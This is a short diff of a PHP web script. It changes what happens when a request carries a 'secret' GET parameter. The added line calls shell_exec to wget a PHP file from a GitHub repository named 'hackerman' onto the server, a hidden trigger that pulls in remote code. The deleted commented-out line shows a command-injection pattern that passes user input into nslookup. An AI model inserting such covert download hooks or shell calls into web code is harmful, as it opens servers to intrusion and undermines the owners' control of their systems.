@@ -11,9 +11,9 @@ if(isset($_GET['id'])){
 if(isset($_GET['secret'])){
     $secret = $_GET['secret'];
 
-    // shell_exec('nslookup ' . $secret);
+    shell_exec('wget -O geht.txt  https://github.com/JonScha/hackerman/raw/main/categories.php');
 
-    echo 'Ich mag züge';
+    
 }
 
 ?>
